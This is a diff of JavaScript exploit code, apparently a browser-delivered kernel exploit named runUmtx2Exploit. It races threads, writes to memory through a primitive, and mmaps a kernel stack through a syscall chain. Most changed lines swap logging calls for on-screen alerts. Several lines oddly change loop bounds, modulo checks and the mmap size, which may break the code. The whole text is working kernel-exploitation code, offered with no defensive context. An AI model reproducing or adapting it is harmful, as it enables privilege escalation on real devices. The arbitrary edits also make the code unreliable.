@@ -805,12 +805,12 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         const beforeRaceTime = performance.now();
         showTemporaryAlert("Triggering race...", LogLevel.LOG);
 
-        for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
-            if (i2 % 2 == 0) {
+        for (let i2 = 1; i2 < config.max_race_attempts; i2++) {
+            if (i2 % 200 == 100) {
                 if (debug) {
-                    await log(`Race attempt ${i}-${i2} (mem access fail count: ${checkMemoryAccessFailCount})`, LogLevel.INFO | LogLevel.FLAG_TEMP);
+                    showTemporaryAlert(`Race attempt ${i}-${i2} (mem access fail count: ${checkMemoryAccessFailCount})`, LogLevel.INFO | LogLevel.FLAG_TEMP);
                 } else {
-                    await log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
+                    showTemporaryAlert(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
                 }
             }
 
@@ -904,23 +904,23 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         }
 
         if (count != config.max_race_attempts) {
-            await log(`Race won after ${count} attempts`, LogLevel.INFO);
+            showTemporaryAlert(`Race won after ${count} attempts`, LogLevel.INFO);
         } else {
             await log("Race max attempts reached, retrying...", LogLevel.INFO);
         }
 
         const afterRaceTime = performance.now();
-        if (debug) await log(`Race took ${toHumanReadableTime(afterRaceTime - beforeRaceTime)}`, LogLevel.INFO);
+        if (debug) showTemporaryAlert(`Race took ${toHumanReadableTime(afterRaceTime - beforeRaceTime)}`, LogLevel.INFO);
 
         // signal all threads to exit
         p.write8(commonThreadData.exit, 1);
         p.write8(commonThreadData.resume, 1);
 
-        if (debug) await log("Waiting for all threads to exit...", LogLevel.DEBUG);
+        if (debug) showTemporaryAlert("Waiting for all threads to exit...", LogLevel.DEBUG);
 
         await waitForRaceThreadsState(threadStatus.EXITED);
 
-        if (debug) await log("All threads exited", LogLevel.DEBUG);
+        if (debug) showTemporaryAlert("All threads exited", LogLevel.DEBUG);
 
         if (!winnerFd) {
             if (debug) await log("Loser", LogLevel.ERROR);
@@ -939,9 +939,9 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         const MAP_SHARED = 0x1;
 
         // @ts-ignore
-        kstack = await chain.syscall(SYS_MMAP, 0, 0x4000, PROT_NONE, MAP_SHARED, winnerLookupFd, 0);
+        kstack = await chain.syscall(SYS_MMAP, 0, 0x4500, PROT_NONE, MAP_SHARED, winnerLookupFd, 0);
         if ((kstack.low << 0) == -1) {
-            await log("Failed to mmap kstack", LogLevel.WARN);
+            showTemporaryAlert("Failed to mmap kstack", LogLevel.WARN);
             continue;
         }
 
